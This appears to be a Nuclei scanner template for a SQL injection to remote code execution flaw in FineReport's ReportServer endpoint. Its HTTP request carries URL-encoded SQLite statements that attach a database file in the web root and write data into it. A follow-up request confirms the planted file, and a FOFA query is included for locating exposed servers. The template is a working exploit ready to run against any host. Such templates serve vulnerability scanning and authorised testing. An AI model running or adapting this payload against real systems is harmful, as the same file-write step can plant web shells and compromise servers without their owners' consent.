id: finereport-sqli-rce_123

info:
  name: FineReport SQLi - Remote Code Execution
  author: adeljck
  severity: critical
  description: |
    Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="帆软-FineReport"
  tags: finereport,rce,sqli,vuln

http:
  - raw:
      - |
        GET /webroot/decision/view/ReportServer?test=&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BF%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%2e%2e%2f%77%65%62%61%70%70%73%2f%77%65%62%72%6f%6f%74%2f%31%32%33%2e%74%78%74%27%20%61%73%20%74%65%73%74%3b'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BF%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%65%78%70%28%64%61%74%61%20%74%65%78%74%29%3b'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BF%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%65%78%70%28%64%61%74%61%29%20%56%41%4c%55%45%53%20%28%27%34%35%36%37%38%39%27%29%3b'),1,1)} HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive
        Content-Length: 0
      - |
        POST /webroot/123.txt HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 302"
          - "contains((header_1), '/webroot/decision/view/report?test&n=truetruetrue')"
          - "status_code_2 == 200"
        condition: and